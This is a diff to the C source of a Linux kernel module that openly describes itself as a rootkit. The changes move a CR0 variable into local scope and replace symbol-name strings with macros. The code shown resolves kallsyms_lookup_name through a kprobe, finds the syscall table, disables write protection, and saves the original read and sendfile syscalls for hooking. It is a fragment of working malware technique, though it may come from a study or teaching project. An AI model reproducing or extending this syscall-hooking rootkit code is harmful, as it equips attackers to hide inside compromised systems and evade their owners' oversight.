@@ -17,7 +17,6 @@ MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
 MODULE_DESCRIPTION("A Linux kernel rootkit");
 MODULE_VERSION("0.1");
 
-static unsigned long ul_orig_cr0;
 static kallsyms_t lookup_name;
 static uint64_t *p_syscall_table;
 static sysfun_t orig_read;
@@ -31,10 +30,11 @@ static sysfun_t orig_sendfile;
 static int __init rootkit_init(void)
 {
 	int i_err;
+	unsigned long ul_orig_cr0;
 
 	// Declare what we need to find
 	struct kprobe probe = {
-		.symbol_name = "kallsyms_lookup_name",
+		.symbol_name = KALLSYMS_NAME,
 	};
 
 	i_err = register_kprobe(&probe);
@@ -51,7 +51,7 @@ static int __init rootkit_init(void)
 	unregister_kprobe(&probe);
 
 	// Find syscall table address
-	p_syscall_table = lookup_name("sys_call_table");
+	p_syscall_table = lookup_name(SYS_CALL_TABLE_NAME);
 
 	ul_orig_cr0 = unprotect_memory();
 
@@ -76,6 +76,8 @@ static int __init rootkit_init(void)
 
 static __exit void rootkit_exit(void)
 {
+	unsigned long ul_orig_cr0;
+
 	// Restore original syscall functions
 	ul_orig_cr0 = unprotect_memory();
 
